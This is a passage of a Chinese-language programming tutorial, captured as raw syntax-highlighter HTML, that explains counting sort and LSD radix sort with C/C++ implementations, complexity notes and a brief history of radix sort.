class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 使C[i]保存着等于i的元素个数</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 使C[i]保存着小于等于i的元素个数，排序后元素i就放在第C[i]个输出位置上</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-27\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-28\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-29\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-30\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-v\">B</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-sy\">)</span><span class=\"crayon-e\">malloc</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-c\">// 分配临时空间,长度为n，用来暂存中间数据</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-31\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">--</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 从后向前扫描保证计数排序的稳定性(重复元素相对次序不变)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-32\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-33\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">[</span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">      </span><span class=\"crayon-c\">// 把每个元素A[i]放到它在输出数组B中的正确位置上</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-34\"><span class=\"crayon-h\">                                  </span><span class=\"crayon-c\">// 当再遇到重复元素时会被放在当前元素的前一个位置上保证计数排序的稳定性</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-35\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-36\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\">   </span><span class=\"crayon-c\">// 把临时空间B中的数据拷贝回A</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-37\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-40\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">free</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">B</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 释放临时空间 </span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-41\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-42\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-43\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-44\"><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-45\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">15</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">22</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">46</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">27</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">73</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">19</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">8</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">  </span><span class=\"crayon-c\">// 针对计数排序设计的输入，每一个元素都在[0,100]上且有重复元素</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-46\"><span class=\"crayon-h\">    </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sizeof</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-47\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">CountingSort</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-48\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"计数排序结果：\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-49\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">n</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">i</span><span class=\"crayon-o\">++</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-50\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-51\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"%d \"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">A</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">i</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-52\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-53\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">printf</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"\\n\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959c3027220010-54\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959c3027220010-55\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0089 seconds] -->\r\n\n</div>\n<p>下图给出了对{ 4, 1, 3, 4, 3 }进行计数排序的简单演示过程</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/05/12e6714c5d9efebc1fee4f6815e48059.gif\" alt=\"\"></p>\n<p>计数排序的时间复杂度和空间复杂度与数组A的数据范围（A中元素的最大值与最小值的差加上1）有关，因此<strong>对于数据范围很大的数组，计数排序需要大量时间和内存。</strong></p>\n<p>例如：对0到99之间的数字进行排序，计数排序是最好的算法，然而计数排序并不适合按字母顺序排序人名，<strong>将计数排序用在基数排序算法中，能够更有效的排序数据范围很大的数组。</strong></p>\n<h2>　　<a name=\"s2\"></a>基数排序(Radix Sort)</h2>\n<p>基数排序的发明可以追溯到1887年赫尔曼·何乐礼在打孔卡片制表机上的贡献。它是这样实现的：将所有待比较正整数统一为同样的数位长度，数位较短的数前面补零。然后，从最低位开始进行基数为10的计数排序，一直到最高位计数排序完后，数列就变成一个有序序列（利用了计数排序的稳定性）。</p>\n<p>基数排序的实现代码如下：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930959cf728295560\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n#include&lt;iostream&gt;\r\nusing namespace std;\r\n\r\n// 分类 ------------- 内部非比较排序\r\n// 数据结构 ---------- 数组\r\n// 最差时间复杂度 ---- O(n * dn)\r\n// 最优时间复杂度 ---- O(n * dn)\r\n// 平均时间复杂度 ---- O(n * dn)\r\n// 所需辅助空间 ------ O(n * dn)\r\n// 稳定性 ----------- 稳定\r\n\r\nconst int dn = 3;                // 待排序的元素为三位数及以下\r\nconst int k = 10;                // 基数为10，每一位的数字都是[0,9]内的整数\r\nint C[k];\r\n\r\nint GetDigit(int x, int d)          // 获得元素x的第d位数字\r\n{\r\n    int radix[] = { 1, 1, 10, 100 };// 最大为三位数，所以这里只要到百位就满足了\r\n    return (x / radix[d]) % 10;\r\n}\r\n\r\nvoid CountingSort(int A[], int n, int d)// 依据元素的第d位数字，对A数组进行计数排序\r\n{\r\n    for (int i = 0; i &lt; k; i++)\r\n    {\r\n        C[i] = 0;\r\n    }\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        C[GetDigit(A[i], d)]++;\r\n    }\r\n    for (int i = 1; i &lt; k; i++)\r\n    {\r\n        C[i] = C[i] + C[i - 1];\r\n    }\r\n    int *B = (int*)malloc(n * sizeof(int));\r\n    for (int i = n - 1; i &gt;= 0; i--)\r\n    {\r\n        int dight = GetDigit(A[i], d);  // 元素A[i]当前位数字为dight   \r\n        B[--C[dight]] = A[i];           // 根据当前位数字，把每个元素A[i]放到它在输出数组B中的正确位置上\r\n        // 当再遇到当前位数字同为dight的元素时，会将其放在当前元素的前一个位置上保证计数排序的稳定性\r\n    }\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        A[i] = B[i];\r\n    }\r\n    free(B);\r\n}\r\n\r\nvoid LsdRadixSort(int A[], int n)     // 最低位优先基数排序\r\n{\r\n    for (int d = 1; d &lt;= dn; d++)     // 从低位到高位\r\n        CountingSort(A, n, d);        // 依据第d位数字对A进行计数排序\r\n}\r\n\r\nint main()\r\n{\r\n    int A[] = { 20, 90, 64, 289, 998, 365, 852, 123, 789, 456 };// 针对基数排序设计的输入\r\n    int n = sizeof(A) / sizeof(int);\r\n    LsdRadixSort(A, n);\r\n    printf(\"基数排序结果：\");\r\n    for (int i = 0; i &lt; n; i++)\r\n    {\r\n        printf(\"%d \", A[i]);\r\n    }\r\n    printf(\"\\n\");\r\n    return 0;\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-35\">35</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-36\">36</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-37\">37</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-38\">38</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-39\">39</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-40\">40</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-41\">41</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-42\">42</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-43\">43</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-44\">44</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-45\">45</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-46\">46</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-47\">47</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-48\">48</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-49\">49</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-50\">50</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-51\">51</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-52\">52</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-53\">53</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-54\">54</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-55\">55</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-56\">56</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-57\">57</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-58\">58</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-59\">59</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-60\">60</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-61\">61</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-62\">62</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-63\">63</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-64\">64</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-65\">65</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-66\">66</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930959cf728295560-67\">67</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930959cf728295560-68\">68</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-1\"><span class=\"crayon-p\">#include&lt;iostream&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-2\"><span class=\"crayon-e\">using </span><span class=\"crayon-t\">namespace</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">std</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-4\"><span class=\"crayon-c\">// 分类 ------------- 内部非比较排序</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-5\"><span class=\"crayon-c\">// 数据结构 ---------- 数组</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-6\"><span class=\"crayon-c\">// 最差时间复杂度 ---- O(n * dn)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-7\"><span class=\"crayon-c\">// 最优时间复杂度 ---- O(n * dn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-8\"><span class=\"crayon-c\">// 平均时间复杂度 ---- O(n * dn)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-9\"><span class=\"crayon-c\">// 所需辅助空间 ------ O(n * dn)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-10\"><span class=\"crayon-c\">// 稳定性 ----------- 稳定</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-11\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-12\"><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">dn</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// 待排序的元素为三位数及以下</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930959cf728295560-13\"><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">k</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\">                </span><span class=\"crayon-c\">// 基数为10，每一位的数字都是[0,9]内的整数</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930959cf728295560-14\"><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">C</span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">k</span><span class=\"crayon-sy\">]</span><span class=\"crayon-sy\">;</span></div><div 